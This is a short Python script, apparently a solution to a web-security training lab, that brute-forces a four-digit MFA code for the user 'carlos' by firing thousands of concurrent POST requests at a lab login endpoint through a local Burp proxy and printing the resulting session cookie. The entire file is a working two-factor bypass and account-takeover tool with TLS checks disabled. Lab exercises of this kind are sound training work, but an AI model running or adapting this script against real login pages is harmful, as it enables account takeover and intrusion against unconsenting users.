import aiohttp
import asyncio

def makeTheBomb():
    wordlist = []
    for count in range (10001):
        wordlist.append(f"{count:04}")
    return wordlist

async def throwTheBomb():
    semaphore = asyncio.Semaphore(500)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        for chunk in get_chunks(makeTheBomb(), 500):
            tasks = [explodeTheBomb(session, pin, semaphore) for pin in chunk]
            #tasks = await asyncio.gather(*tasks)
            for task in asyncio.as_completed(tasks):
                result = await task
                if result[0]:
                    print (f"\n\nFOUND -{result[1]}\nSession - {result[2]}")
                    return
        print ("Deu ruim papai")

async def explodeTheBomb (session:object, pin:int, semaphore):
        url = "https://0a0100c703c27f7d80c867b7007f0095.web-security-academy.net/login2"
        cooks = {"verify": "carlos", "session" : "DofLqz5YVeTGNgFJTrR2budbug0j4nef"}
        data = {"mfa-code": str(pin)}
        myburp = 'http://127.0.0.1:8081'
        async with semaphore:
            try:
                async with session.post(url, cookies= cooks, data= data, proxy= myburp, allow_redirects=False) as req:
                    print (f"Trying PIN: {pin} >>> {req.status}")
                    if req.status == 302:
                        sess = req.cookies.get("session")
                        return True, pin, sess
            except Exception as e:
                print (f"\n\n\n{e}\n\n\n")
        return False, None, None

def get_chunks(wordlist:list, chunk_size:int):
    for i in range (0, len (wordlist), chunk_size):
        yield wordlist[i:i + chunk_size]     


asyncio.run(throwTheBomb())
